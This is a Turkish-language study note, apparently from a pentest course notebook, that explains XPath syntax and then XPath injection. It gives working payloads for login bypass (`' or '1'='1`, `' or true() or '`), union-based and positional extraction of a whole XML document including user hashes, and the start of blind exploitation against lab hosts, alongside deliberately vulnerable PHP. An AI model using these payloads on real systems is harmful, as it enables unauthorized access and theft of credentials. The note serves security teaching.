---
{"dg-publish":true,"permalink":"/web-pentest-expert/x-path-injection/"}
---


**XPath**, **XML** verileri için bir sorgu dilidir. Kullanıcı girdisi doğru şekilde filtrelenmezse, **SQL Injection** benzeri **XPath Injection** güvenlik açıkları oluşabilir.


## XPath Temelleri

XPath'e giriş yapabilmek için öncelikle XPath terminolojisinde bir temel oluşturmamız gerekir. Bunu yapmak için aşağıdaki XML dokümanını ele alalım:

```xml
<?xml version="1.0" encoding="UTF-8"?>
  
<academy_modules>  
  <module>
    <title>Web Attacks</title>
    <author>21y4d</author>
    <tier difficulty="medium">2</tier>
    <category>offensive</category>
  </module>

  <!-- this is a comment -->
  <module>
    <title>Attacking Enterprise Networks</title>
    <author co-author="LTNB0B">mrb3n</author>
    <tier difficulty="medium">2</tier>
    <category>offensive</category>
  </module>
</academy_modules>
```


Bir XML dokümanı genellikle XML versiyonunu ve kodlamasını belirten ==XML  declaration== (bildirimi) ile başlar. Yukarıdaki XML dokümanında, XML bildirimi `<?xml version=“1.0” encoding=“UTF-8”?>` şeklindedir. Bildirim atlanırsa, XML parser'ı `1.0` versiyonunu ve `UTF-8` kodlamasını varsayar.

Bir **XML** dokümanındaki veri, **root element node** olarak adlandırılan en üst **node**'dan oluşan bir **tree** yapısında biçimlendirilir. Bizim örneğimizde bu **academy_modules** node'udur. XML'deki temel **node** türleri şunlardır:

1. **Root Element Node**: En üst **node** (**academy_modules**).
2. **Element Nodes**: **module**, **title** gibi **nodes**.
3. **Attribute Nodes**: **co-author="LTNB0B"**, **difficulty="medium"** gibi **attributes**.
4. **Comment Nodes**: `<!-- this is a comment -->` gibi **comments**.
5. **Text Nodes**: **Web Attacks**, **LTNB0B** gibi **element** veya **attribute nodes**'tan gelen karakter verileri.
6. **Namespace Nodes**: (Bu örnekte ele alınmayan, **namespace** tanımlayan **nodes**).
7. **Processing Instruction Nodes**: (Belirli processing talimatları içeren **nodes**).

XML dokümanları bir tree yapısı oluşturduğundan, her element ve attribute node'u tam olarak bir ==parent node'a== sahipken, her element node'u keyfi sayıda ==child node'a== sahip olabilir. Aynı parent'e sahip node'lara ==sibling node'lar== denir. Tüm ==ancestor (ata)== node'ları veya ==descendant (torun) node'lar==ı belirlemek için tree'yi belirli bir node'dan yukarı veya aşağı doğru gezebiliriz.

```
<academy_modules>  
  <module>
    <title>Web Attacks</title>
    <author>21y4d</author>
    <tier difficulty="medium">2</tier>
    <category>offensive</category>
  </module>
</academy_modules>
```


- **Parent Node**: `<module>` elementi, `<title>`, `<author>`, `<tier>`, `<category>` elementlerinin **parent node**'udur.
- **Child Nodes**: `<module>`'ün **child nodes**'ları: `<title>`, `<author>`, `<tier>`, `<category>`.
- **Sibling Nodes**: `<title>`, `<author>`, `<tier>`, `<category>` aynı **parent node**'a (**module**) sahip olduğu için **sibling nodes**'dır.
- **Ancestor Nodes**: `<title>` elementinin **ancestor nodes**'ları **module** ve **academy_modules**.
- **Descendant Nodes**: `<module>` elementinin **descendant nodes**'ları **title, author, tier, category**.


## Nodes

Artık XPath'in temel terminolojisini tartıştığımıza göre, query syntax'ına geçebiliriz. Bu modülde, sadece kısaltılmış syntax'ı tartışacağız. XPath syntax hakkında daha fazla ayrıntı için [W3C specification](https://www.w3.org/TR/xpath-3/)'a bakın.

Her XPath sorgusu XML dokümanında bir dizi node seçer. Bir sorgu, başlangıç noktasını işaret eden bir ==context node'dan== itibaren değerlendirilir. Bu nedenle, context node'a bağlı olarak, aynı sorgu farklı sonuçlara sahip olabilir. Burada, nodların seçilmesi için XPath sorgularının temel durumlarına genel bir bakış sunulmaktadır:

|**Query**|**Açıklama**|
|---|---|
|`module`|Context node’un **module** olan tüm **child node**'larını seç|
|`/`|**Document root node**'u seç|
|`//`|Context node’un **descendant node**'larını seç|
|`.`|**Context node**'u seç|
|`..`|**Context node**'un **parent node**'unu seç|
|`@difficulty`|**Context node**'un **difficulty attribute node**'unu seç|
|`text()`|**Context node**'un tüm **text node child node**'larını seç|

Bu temel durumları daha karmaşık sorgular oluşturmak için kullanabiliriz. Context node'a bağlı olarak sorgu sonucunun belirsizliğini önlemek için, sorgumuzu document root'tan başlatabiliriz:

| **Query**                                  | **Açıklama**                                                                                      |
| ------------------------------------------ | ------------------------------------------------------------------------------------------------- |
| `/academy_modules/module`                  | **academy_modules node**'unun tüm **module child node**'larını seç                                |
| `//module`                                 | Tüm **module node**'larını seç                                                                    |
| `/academy_modules//title`                  | **academy_modules node**'un **descendant node**'u olan tüm **title node**'larını seç              |
| `/academy_modules/module/tier/@difficulty` | Belirtilen path altındaki tüm **tier element node**'larının **difficulty attribute node**'unu seç |
| `//@difficulty`                            | Tüm **difficulty attribute node**'larını seç                                                      |

Not: Bir sorgu // ile başlıyorsa, sorgu context node'da değil document root'ta değerlendirilir.


## Predicates (Koşullu filtreler)

**Predicates**, bir **XPath query**'sinden gelen sonucu **SQL query**'lerindeki **WHERE clause** gibi filtreler. **Predicates**, **XPath query**'nin bir parçasıdır ve köşeli parantez `[]` içinde bulunur. İşte bazı **predicate** örnekleri:

| Query                                    | Açıklama                                                                                                                 |
| ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------------ |
| `/academy_modules/module[1]`             | `academy_modules` node'unun ilk `module` child node'unu seç                                                              |
| `/academy_modules/module[position()=1]`  | Yukarıdaki sorgu ile aynı                                                                                                |
| `/academy_modules/module[last()]`        | `academy_modules` node'unun son `module` child node'unu seç                                                              |
| `/academy_modules/module[position()<3]`  | `academy_modules` node'unun ilk iki `module` child node'unu seç                                                          |
| `//module[tier=2]/title`                 | `tier` element node'u `2` olan tüm `module` node'larının `title` element node'unu seç                                    |
| `//module/author[@co-author]/../title`   | `author` element node'u `co-author` attribute node'una sahip olan tüm `module` node'larının `title` element node'unu seç |
| `//module/tier[@difficulty="medium"]/..` | `tier` element node'u `difficulty="medium"` attribute node'una sahip olan tüm `module` node'larını seç                   |


Predicates aşağıdaki operandları destekler:

|Operand|Explanation|
|---|---|
|`+`|Addition|
|`-`|Subtraction|
|`*`|Multiplication|
|`div`|Division|
|`=`|Equal|
|`!=`|Not Equal|
|`<`|Less than|
|`<=`|Less than or Equal|
|`>`|Greater than|
|`>=`|Greater than or Equal|
|`or`|Logical Or|
|`and`|Logical And|
|`mod`|Modulus|

## Wildcards & Union

Bazen bir path içindeki node türüyle ilgilenmeyiz. Bu durumda aşağıdaki wildcard'lardan birini kullanabiliriz:

| Sorgu  | Açıklama                                |
| ------ | --------------------------------------- |
| node() | Herhangi bir node ile eşleşir           |
| *      | Herhangi bir element node ile eşleşir   |
| @*     | Herhangi bir attribute node ile eşleşir |

Bu joker karakterleri aşağıdaki gibi sorgular oluşturmak için kullanabiliriz:

| Query                    | Explanation                                                                          |
| ------------------------ | ------------------------------------------------------------------------------------ |
| `//*`                    | Dokümandaki tüm element node'larını seçer                                            |
| `//module/author[@*]/..` | Author element node'unda herhangi bir attribute node'u bulunan tüm module'leri seçer |
| `/*/*/title`             | Doküman root'undan tam iki seviye aşağıda bulunan tüm title node'larını seçer        |
Not: `*` wildcard'ı herhangi bir node ile eşleşir ancak `//` gibi descendants (torunlar) ile eşleşmez. Bu nedenle, sorgumuzda doğru miktarda wildcard belirtmemiz gerekir. Örnek XML belgemizde, `/*/*/title` sorgusu tüm modül title'larını döndürür, ancak `/*/title` sorgusu hiçbir şey döndürmez.

Son olarak, birden fazla XPath sorgusunu union operatörü ile birleştirebiliriz `|` aşağıdaki gibi:

| Query                                                            | Explanation                                           |
| ---------------------------------------------------------------- | ----------------------------------------------------- |
| `//module[tier=2]/title/text() \| //module[tier=3]/title/text()` | 2 ve 3 katmanlarındaki tüm modüllerin title'ını seçin |



# XPath - Authentication Bypass

Artık XPath query syntax hakkında temel bir fikre sahip olduğumuza göre XPath injection ile başlayalım. XPath injection'ları, SQL injection'larına benzer şekilde, web kimlik doğrulamasını atlamak için silah olarak kullanılabilir. Bu bölümde böyle bir senaryoyu tartışacağız.


## Temel

XPath enjeksiyonu yoluyla authentication bypass'larını keşfetmeye ve kullanmaya girişmeden önce, XPath sorguları yoluyla authentication'ın nasıl uygulanabileceğini tartışmamız gerekir. Örnek olarak, kullanıcı verilerini aşağıdaki gibi depolayan bir XML dokümanı düşünelim:

```xml
<users>
	<user>
		<name first="Kaylie" last="Grenvile"/>
		<id>1</id>
		<username>kgrenvile</username>
		<password>P@ssw0rd!</password>
	</user>
	<user>
		<name first="Admin" last="Admin"/>
		<id>2</id>
		<username>admin</username>
		<password>admin</password>
	</user>
	<user>
		<name first="Academy" last="Student"/>
		<id>3</id>
		<username>htb-stdnt</username>
		<password>Academy_student!</password>
	</user>
</users>
```

Authentication gerçekleştirmek için web uygulaması aşağıdaki gibi bir XPath query çalıştırabilir:

```xpath
/users/user[username/text()='htb-stdnt' and password/text()='Academy_student!']
```

Güvenlik açığı bulunan PHP kodu, username ve password'ü önceden sterilize etmeden sorguya ekler:

```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . $_POST['password'] . "']";
$results = $xml->xpath($query);
```


XPath sorgusunun her zaman ==true== olarak değerlendirileceği şekilde bir username ve password inject ederek kimlik doğrulamayı atlatmayı hedefliyoruz. Bunu, username ve password olarak `' or '1'='1` değerlerini enjekte ederek başarabiliriz. Ortaya çıkan XPath sorgusu aşağıdaki gibi görünür:

```xpath
/users/user[username/text()='' or '1'='1' and password/text()='' or '1'='1']
```

Predicate ==true== olarak değerlendirildiğinden, sorgu XML dokümanındaki tüm ==user== element node'larını döndürür. Dolayısıyla, ilk kullanıcı olarak oturum açmış oluruz. Örnek dokümanımızda bu, ==kgrenvile== kullanıcısıdır. Ancak, en yüksek izinleri almak için ==admin== kullanıcısı olarak oturum açmak istersek ne olur? Bu durumda, `admin' or '1'='1` şeklinde bir username ve password için rastgele bir değer girmemiz gerekir. Bu şekilde, ortaya çıkan XPath sorgusu aşağıdaki gibi görünür:

```xpath
/users/user[username/text()='admin' or '1'='1' and password/text()='abc']
```

Yukarıdaki sorgu, `or` koşulu nedeniyle doğru şifreyi sağlamadan admin kullanıcısı olarak giriş yapmamıza olanak tanır.

## Exploitation

Gerçek dünya senaryolarında, şifreler genellikle hash'lenir. Ayrıca, geçerli bir kullanıcı adı bilmeyebiliriz, bu nedenle yukarıda belirtilen payload'ları kullanamayız. Neyse ki, bu tür durumlarda kimlik doğrulamasını atlatmak için daha gelişmiş injection payload'ları kullanabiliriz. Aşağıdaki örneği göz önünde bulunduralım:

```xml
<users>
	<user>
		<name first="Kaylie" last="Grenvile"/>
		<id>1</id>
		<username>kgrenvile</username>
		<password>8a24367a1f46c141048752f2d5bbd14b</password>
	</user>
	<user>
		<name first="Admin" last="Admin"/>
		<id>2</id>
		<username>obfuscatedadminuser</username>
		<password>21232f297a57a5a743894a0e4a801fc3</password>
	</user>
	<user>
		<name first="Academy" last="Student"/>
		<id>3</id>
		<username>htb-stdnt</username>
		<password>295362c2618a05ba3899904a6a3f5bc0</password>
	</user>
</users>
```

Bu durumda, savunmasız PHP kodu aşağıdaki gibi görünebilir:

```php
$query = "/users/user[username/text()='" . $_POST['username'] . "' and password/text()='" . md5($_POST['password']) . "']";
$results = $xml->xpath($query);
```


Password, sorguya eklenmeden önce hash'lendiği için, `' or '1'='1'` username ve password enjeksiyon yapıldığında aşağıdaki sorgu oluşacaktır:

```xpath
/users/user[username/text()='' or '1'='1' and password/text()='59725b2f19656a33b3eed406531fb474']
```

Bu sorgu herhangi bir node döndürmez, bu nedenle kimlik doğrulamayı bu şekilde atlayamayız. Ayrıca geçerli bir kullanıcı adı da bilmiyoruz, bu yüzden şu ana kadar tartışılan payload'lar ile kimlik doğrulamayı atlayamayız.

İlk olarak, XPath sorgusunun true döndürmesini sağlayarak tüm kullanıcı node'larının dönmesini ve böylece ilk kullanıcı olarak giriş yapmamızı sağlamak için kullanıcı adına bir "double or" koşulu enjekte edebiliriz. Örnek bir payload `' or true() or '` şeklinde olabilir ve bu, aşağıdaki sorguya neden olur:

```xpath
/users/user[username/text()='' or true() or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```

Sorgunun değerlendirilme şekli nedeniyle, "double or" koşulu sorgunun evrensel olarak true döndürmesine neden olur ve bu şekilde kimlik doğrulama atlanır. Ancak, daha önce tartışıldığı gibi, daha fazla ayrıcalık elde etmek için belirli bir kullanıcı olarak giriş yapmak isteyebiliriz.

Bunu yapmanın bir yolu, tüm kullanıcıları konumlarına göre tek tek denemektir. Bu, aşağıdaki payload ile gerçekleştirilebilir: `' or position()=2 or '`, bu da aşağıdaki sorguya neden olur:

```xpath
/users/user[username/text()='' or position()=2 or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```

Bu yalnızca ikinci kullanıcı node'unu döndürecektir. Konumu artırarak tüm kullanıcılar üzerinde tek tek gezinip aradığımız kullanıcıyı bulana kadar deneme yapabiliriz. Gerçek dünya senaryolarında milyonlarca kullanıcı olabileceğinden, bu manuel teknik çok hızlı bir şekilde uygulanamaz hale gelecektir. Bunun yerine, kullanıcı adının bir kısmını biliyorsak belirli kullanıcıları arayabiliriz. Bunun için aşağıdaki payload'ı kullanabiliriz: `' or contains(.,'admin') or '`, bu da aşağıdaki sorguya neden olur:

```xpath
/users/user[username/text()='' or contains(.,'admin') or '' and password/text()='59725b2f19656a33b3eed406531fb474']
```

Bu sorgu, herhangi bir descendants (torununda) admin string'ini içeren tüm kullanıcı node'larını döndürür. Kullanıcı adı node'u kullanıcı node'unun bir child'ı olduğundan, bu, kullanıcı adında admin substring'ini içeren tüm kullanıcıları döndürür.


# XPath - Data Exfiltration (Veri Sızıntısı)

Önceki bölümde XPath enjeksiyonu kullanarak kimlik doğrulamayı atlamayı tartıştığımıza göre, bu bölümde veri sızıntısı (data exfiltration) üzerine odaklanacağız. Özellikle, UNION based SQL enjeksiyonlarına benzer teknikler kullanarak XPath sorgularını manipüle edip XML dokümanlarında keyfi verilere nasıl erişebileceğimizi tartışacağız.


## Simple Data Exfiltration

Basit bir temel senaryoda XPath enjeksiyonu yoluyla data exfiltrasyonu göstermek için, San Francisco'daki caddeler hakkında data sorgulamamızı sağlayan bir web uygulamasını ele alalım. Bir search query girebilir ve uzun ya da kısa bir sokak adı arasında seçim yapabiliriz. Web uygulaması San Francisco'da sorgumuzla eşleşen tüm sokakları görüntüler:

![Pasted image 20250213013246.png](/img/user/Pasted%20image%2020250213013246.png)

İsteğe baktığımızda, arama sorgusunun `q` GET parametresinde gönderildiğini, uzun/kısa sokak adı seçimimizin ise `f` GET parametresinde iletildiğini görebiliriz:

![Pasted image 20250213015659.png](/img/user/Pasted%20image%2020250213015659.png)



Web uygulaması, search sorgumuzu bir substring olarak içeren tüm sokakları döndürür. f parametresi, eşleşen sokakların hangi özellikteki tam sokak adının veya kısaltılmış bir versiyonunun görüntüleneceğini kontrol ediyor gibi görünüyor. Bu, iki node adı ortaya çıkarır: ==fullstreetname== ve ==streetname==. XPath injection güvenlik açıklarından başarılı bir şekilde faydalanmak için, SQL injection güvenlik açıklarından faydalanırken yapılana benzer şekilde, web uygulaması tarafından sorgulanan XPath sorgusunun ve beraberindeki XML dokümanının yapısını anlamaya/tasvir etmeye çalışmak çok önemlidir.

Web uygulamasının davranışından, gerçekleştirilen XPath sorgusu hakkında bilgi çıkarabiliriz. XML dokümanında element node'larının isimlerini bilmediğimiz için, yolu a, b, c ve d gibi tek karakterli placeholder isimleriyle göstereceğiz:

```xpath
/a/b/c/[contains(d/text(), 'BAR')]/fullstreetname
```

Not: XML şemasının derinliğinin yukarıda gösterildiği gibi üç (/a/b/c) olup olmadığını bilmiyoruz. Şema derinliğinin nasıl belirleneceğini bir sonraki bölümde tartışacağız.

Bu durumda, GET parametresi `q` içinde sağladığımız search string, `contains` fonksiyonu kullanılarak sokak adını filtreleyen predicate'nin içine yerleştirilir. Ardından, GET parametresi `f`, web uygulamasının eşleşen tüm sokaklardan hangi özelliği görüntüleyeceğini belirler, bu nedenle sorgunun sonuna eklenir.

Yukarıdaki sorgudan, XML dokümanının buna benzer görünmesi gerektiğini biliyoruz (yine, node isimlerini bilmiyoruz, bu yüzden yukarıdaki ile aynı placeholder isimlerini kullanıyoruz):

```xml
<a>
	<b>
		<c>
			<d>???</d>
			<streetname>BARCELONA</streetname>
			<fullstreetname>BARCELONA AVE</fullstreetname>
		</c>
	</b>
</a>
```

#### XPath Enjeksiyonunu Doğrulama

XPath enjeksiyonunu, `q` parametresine `SOMETHINGINVALID') or ('1'='1` payloadını göndererek doğrulayabiliriz. Bu, aşağıdaki XPath sorgusunun oluşmasına neden olacaktır:

```xpath
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]
```

Sağladığımız substring geçersiz olsa da, enjekte edilen `or` ifadesi `true` olarak değerlendirilir ve böylece predicate evrensel olarak `true` haline gelir. Bu nedenle, bu derinlikteki tüm nodelarla eşleşir. Bu payload gönderdiğimizde, web uygulaması tüm sokak adlarıyla yanıt verir ve bu da XPath enjeksiyon güvenlik açığını doğrular:

![Pasted image 20250213021638.png](/img/user/Pasted%20image%2020250213021638.png)

#### Exfiltrating Data

Sokak verileri dışında veri sızdırmak için bu XPath enjeksiyonundan nasıl faydalanabiliriz? En kolay yol, ilginç bilgiler için arama yapabilmemiz amacıyla XML dokümanının tamamını döndüren bir sorgu oluşturmaktır. Bunu başarmanın birçok farklı yolu vardır. Ancak, en basit olanı muhtemelen tüm text nodelarını döndüren yeni bir sorgu eklemektir. Bunu aşağıdaki gibi bir istekle yapabiliriz:

```http
GET /index.php?q=SOMETHINGINVALID&f=fullstreetname+|+//text() HTTP/1.1
Host: xpath-exfil.htb
```

Web uygulaması daha sonra aşağıdaki sorguyu yürütecektir:

```xpath
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | //text()
```

UNION based SQL enjeksiyonuna benzer şekilde, `|` operatörüyle ikinci bir sorgu ekliyoruz. İkinci sorgu olan `//text()`, XML dokümanındaki tüm text nodelarını döndürür. Bu nedenle, yanıt XML dökümanında saklanan tüm verileri içerir. XML dökümanının boyutuna bağlı olarak, yanıt oldukça büyük olabilir. Bu nedenle, verileri dikkatlice incelemek biraz zaman alabilir. Örneğimizde, San Francisco sokaklarına ilişkin bilgileri içeren veri kümesinden sonra, dökümanın sonunda bir kullanıcı data kümesi bulabiliriz:

![Pasted image 20250213021909.png](/img/user/Pasted%20image%2020250213021909.png)

Böylece, XML dokümanının tamamını dışarı sızdırmak için XPath enjeksiyonundan başarıyla yararlandık

Bu payload, `q` parametresinde `SOMETHINGINVALID') or ('1'='1` şeklinde kullanarak ve `f` parametresini `../../..//text()` olarak ayarlayarak aynı sonuca ulaşabiliriz. Bu, aşağıdaki XPath sorgusuna yol açacaktır:

```xpath
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID') or ('1'='1')]/../../..//text()
```

Predicate, enjekte ettiğimiz `or` ifadesi nedeniyle her zaman doğru olacaktır. Ayrıca, `f` parametresine enjekte ettiğimiz **payload**, dokümanın **root**'una geri gider ve tüm `text()` nodelarını seçer, tıpkı önceki **payload**'umuz gibi. Bu nedenle, bu sorgu da tüm XML **doküman**ını döndürür.


# XPath - Advanced Data Exfiltration

Bazen, XML dokümanının tamamını bir kerede çıkarmak imkansızdır. Bir XPath sorgusunun yalnızca ilk beş sonucunu görüntüleyen bir web uygulaması düşünün. Önceki payload'umuzu sorgu tüm XML dokümanını döndürecek şekilde enjekte edersek, yalnızca ilk 5 data noktasını exfiltrate edebiliriz. Bu nedenle, tüm verileri sızdırmak için XML dokümanının tamamını manuel olarak yinelemek üzere payload'umuzu değiştirmemiz gerekir.

## Advanced Data Exfiltration

Bu bölümde, önceki bölümdeki web uygulamasının biraz değiştirilmiş bir versiyonu üzerinde çalışıyoruz. Bu versiyon, döndürülen sonuç sayısını sınırlandırarak tüm **XML document**’ını tek seferde sızdırmamızı engelliyor. **XML schema**’yı adım adım keşfetmek için öncelikle **schema depth**’ini belirlememiz gerekiyor.

Bunu başarmak için, orijinal **XPath query**’sinin herhangi bir sonuç döndürmediğinden emin olmalı ve ardından **schema depth** hakkında bilgi veren yeni bir sorgu eklemeliyiz. **q** parametresini, veri döndürmeyen bir değerle ayarlıyoruz, örneğin `SOMETHINGINVALID`. Daha sonra **f** parametresini `fullstreetname | /*[1]` olarak belirliyoruz.

```xpath
/a/b/c/[contains(d/text(), 'SOMETHINGINVALID')]/fullstreetname | /*[1]
```

Alt sorgu `/*[1]`, **document root** olan `/`’dan başlar, **wildcard** `*` nedeniyle **node tree**’de bir seviye aşağı iner ve **predicate** `[1]` kullanarak ilk **child node**’u seçer. Böylece, bu alt sorgu **document root element node**’unu seçmiş olur.

**Document root element node**, birden fazla **child node** içerdiğinden, PHP’de **array** veri tipine sahiptir. Yanıtı analiz ettiğimizde bunu doğrulayabiliriz. Web uygulaması **string** beklerken bir **array** alır ve bu nedenle sonuçları ekrana yazdıramaz, bu da **boş bir yanıt** ile sonuçlanır.

![Pasted image 20250213032903.png](/img/user/Pasted%20image%2020250213032903.png)

Artık **schema depth**’ini belirlemek için alt sorguya iteratif olarak ek `/*[1]` ekleyebiliriz. Bunu, web uygulamasının davranışı değişene kadar tekrar ederiz. Sonuçlar şu şekilde görünür (**q** parametresi tüm isteklerde yukarıdaki gibi aynı kalır):

|Value of the `f` GET parameter|Response|
|---|---|
|`fullstreetname \| /*[1]`|Nothing|
|`fullstreetname \| /*[1]/*[1]`|Nothing|
|`fullstreetname \| /*[1]/*[1]/*[1]`|Nothing|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[1]`|`01ST ST`|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[1]/*[1]`|`No Results!`|

Yukarıdaki sonuçlardan, sokak verileri için şema derinliğinin 4 olduğu sonucunu çıkarabiliriz:

![Pasted image 20250213033009.png](/img/user/Pasted%20image%2020250213033009.png)

Bu, daha fazla veri alınamayana kadar son increas'taki konumu artırarak veri sızdırmaya başlamamızı sağlar:

|Value of the `f` GET parameter|Response|
|---|---|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[1]`|`01ST ST`|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[2]`|`01ST`|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[3]`|`ST`|
|`fullstreetname \| /*[1]/*[1]/*[1]/*[4]`|`No Results!`|

Veri kümesindeki ilk sokağa ait bilgileri başarılı bir şekilde sızdırdık. Üç değer, uzun **street name**, kısa **street name** ve **street type** gibi görünüyor. Böylece, önceki bölümdeki **XML schema**’nın bazı yerlerini doldurabiliriz. Ancak, hala kesin **node name**’leri bilmiyoruz. Burada sadece **XML document**’ın yapısına genel bir bakış oluşturmaya çalışıyoruz.

```xml
<a>
	<b>
		<street>
			<fullstreetname>01ST ST</fullstreetname>
			<streetname>01ST</streetname>
			<street_type>ST</street_type>
		</street>
	</b>
</a>
```

Şimdi, enjekte edilen payload'umuzdaki sondan ikinci pozisyon predicate'ini aşağıdaki gibi artırarak veri setindeki ikinci sokak hakkında bilgi çıkarabiliriz:

|Value of the `f` GET parameter|Response|
|---|---|
|`fullstreetname \| /*[1]/*[1]/*[2]/*[1]`|`02ND AVE`|
|`fullstreetname \| /*[1]/*[1]/*[2]/*[2]`|`02ND`|
|`fullstreetname \| /*[1]/*[1]/*[2]/*[3]`|`AVE`|
|`fullstreetname \| /*[1]/*[1]/*[2]/*[4]`|`No Results!`|

Bunu, tüm sokaklara ait bilgileri sızdırana kadar tekrarlayabiliriz. Ancak, asıl ilgilendiğimiz sokaklar olmadığından, **XML document** içinde başka veri kümeleri olup olmadığına bakalım.

**Payload** içindeki ilk **position predicate**’i artırmak mantıklı değildir çünkü bu, **document root**’tur ve geçerli bir **XML document**, yalnızca bir **document root** içerir. Ancak, ikinci **position predicate**’i değiştirerek **XML document** içinde ek veri kümeleri bulabiliriz.

Ayrıca, yeni bir veri kümesi keşfettiğimizde, **schema depth**’ini tekrar belirlememiz gerekir, çünkü bu, **streets data set**’inin derinliğinden farklı olabilir. Bunu göstermek için aşağıdaki örnek **XML document**’ı ele alalım:

```xml
<dataset>
	<streets>
		<street>
			<fullstreetname>01ST ST</fullstreetname>
			<streetname>01ST</streetname>
			<street_type>ST</street_type>
		</street>
	</streets>
	<users>
		<group name="users">
			<user>
				<username>test</username>
				<password>test</password>
			</user>
		</group>
		<group name="admins">
			<user>
				<username>admin</username>
				<password>admin</password>
			</user>
		</group>
	</users>
</dataset>
```

Yukarıdaki **XML document**’ı sorguladığımızda, **street nodes** **depth 3** seviyesinde bulunur: `/dataset/streets/street`. Ancak, **user nodes** **depth 4** seviyesindedir: `/dataset/users/group/user`.

Bu nedenle, derinlik farklıdır ve **users** verisini sızdırabilmek için **schema depth**’ini tekrar belirlememiz gerekir. Bunu yapmak için aşağıdaki **parameter values**’u kullanabiliriz. **XML document** içindeki ikinci veri kümesini hedeflediğimizden, başlangıç noktası olarak `/*[1]/*[2]` kullanmalıyız.

|Value of the `f` GET parameter|Response|
|---|---|
|`fullstreetname \| /*[1]/*[2]`|Nothing|
|`fullstreetname \| /*[1]/*[2]/*[1]`|Nothing|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]`|Nothing|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[1]`|`htb-stdnt`|
|`fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[1]/*[1]`|`No Results!`|

Schema derinliğinin 5 olduğunu görebiliyoruz. Ayrıca, bir username sızdırmış gibi görünüyoruz. Daha önce sokak verilerinde yaptığımız gibi, son konum predicate'ini artırarak tüm kullanıcı verilerini sızdırabiliriz:

| Value of the `f` GET parameter                | Response                             |
| --------------------------------------------- | ------------------------------------ |
| `fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[1]` | `htb-stdnt`                          |
| `fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[2]` | `295362c2618a05ba3899904a6a3f5bc0`   |
| `fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[3]` | `HackTheBox Academy Student Account` |
| `fullstreetname \| /*[1]/*[2]/*[1]/*[1]/*[4]` | `No Results!`                        |

Sızdırdığımız verilere göre, **username**, **password hash** ve **description** içeren bir **user object** elde etmiş görünüyoruz. Artık, tüm **users** verisini sızdırmak için **street data set**’inde yaptığımız gibi **position indices**’i sağdan sola doğru iteratif olarak artırabiliriz.

Not: Bir XML dokümanının tamamını dışarı sızdırmak için, dışarı sızdırma işlemini bizim yerimize yapan basit bir komut dosyası uygulamak mantıklıdır.


# XPath - Blind Exploitation

Tüm **XML schema**’yı manuel olarak iteratif şekilde gezerek veri sızdırma yöntemini tartıştıktan sonra, şimdi **blind exploitation** tekniklerine odaklanacağız.

Web uygulamasının **XPath query** sonuçlarını bize göstermediği durumlarda bile, **blind SQL injection**’a benzer bir metodoloji kullanarak veri sızdırmak mümkündür. Ancak, **XPath** içinde bir **sleep function** bulunmadığından, sorgunun herhangi bir sonuç döndürüp döndürmediğini gösteren bir **indicator**’a ihtiyacımız var.

Bu yöntem, bize **binary information** sızdırır ve böylece veriler doğrudan görüntülenmeden **exfiltration** gerçekleştirmemizi sağlar.


## Methodology

Öncelikle **XML schema**’yı nasıl sızdıracağımızı tartışacağız. Bu, **XPath queries** enjekte ederek ilgilendiğimiz verileri hedeflememizi sağlar. Böylece, **wildcard** kullanmadan **element nodes**’ların isimlerini sızdırabilir ve sorgularımızı daraltarak spesifik veri noktalarını hedefleyebiliriz.

Bunu gerçekleştirmek için **name()**, **substring()**, **string-length()** ve **count()** fonksiyonlarını kullanabiliriz:

- **name()** fonksiyonu herhangi bir **node** üzerinde çağrılabilir ve o **node**’un ismini döndürür.
- **substring()** fonksiyonu, bir **node** ismini tek tek karakterler halinde sızdırmamızı sağlar.
- **string-length()** fonksiyonu, bir **node name**’in uzunluğunu belirleyerek **exfiltration**’ı ne zaman durdurmamız gerektiğini anlamamıza yardımcı olur.
- **count()** fonksiyonu, bir **element node**’un kaç tane **child node**’u olduğunu döndürür.

Şimdi, **sample web application** üzerinde **predicate içeren bir XPath query**’de bulunan **XPath injection** noktasını kullanarak **blind data exfiltration** metodolojisini ele alacağız.

**Not:** Eğer **XPath injection** noktası bir **predicate** içinde değilse, aşağıda açıklanan metodolojiyi uygulayabilmek için kendi **predicate**’imizi ekleyebiliriz.


## Exploitation

Aşağıdaki web uygulamasını başlattığımızda, platform kullanıcılarına kullanıcı adlarını vererek anonim olarak mesaj göndermemizi sağlayan bir mesaj panosu web uygulaması görebiliriz:

![Pasted image 20250213134535.png](/img/user/Pasted%20image%2020250213134535.png)

Geçerli bir kullanıcı adı girsek de girmesek de web uygulaması farklı tepki verir. Geçerli bir kullanıcı adı sağlarsak, bize mesajın başarıyla gönderildiğini söyler:

![Pasted image 20250213134558.png](/img/user/Pasted%20image%2020250213134558.png)

Ancak, username geçersizse, farklı bir yanıt alırız:

![Pasted image 20250213134634.png](/img/user/Pasted%20image%2020250213134634.png)


#### Doğrulama XPath Injection

**Blind exploitation**’a başlamadan önce, web uygulamasının **XPath injection**’a karşı savunmasız olup olmadığını belirlememiz gerekir.

Sağladığımız **username**, geçerliliği kontrol edilerek işleniyor. Bu nedenle, aşağıdaki gibi bir **XPath query** içinde kullanıldığını varsayabiliriz:

```xpath
/users/user[username='invalid' or '1'='1']
```

Sağladığımız **username** geçersiz olsa da, enjekte ettiğimiz **or clause** nedeniyle sorgu yine de veri döndürmelidir. Bu, **universally true predicate** oluşturduğu için gerçekleşir.

Böylece, web uygulaması sanki geçerli bir **username** sağlamışız gibi yanıt verir.

![Pasted image 20250213134947.png](/img/user/Pasted%20image%2020250213134947.png)

Bu nedenle, web uygulamasının blind XPath enjeksiyonuna karşı savunmasız olduğunu doğruladık.

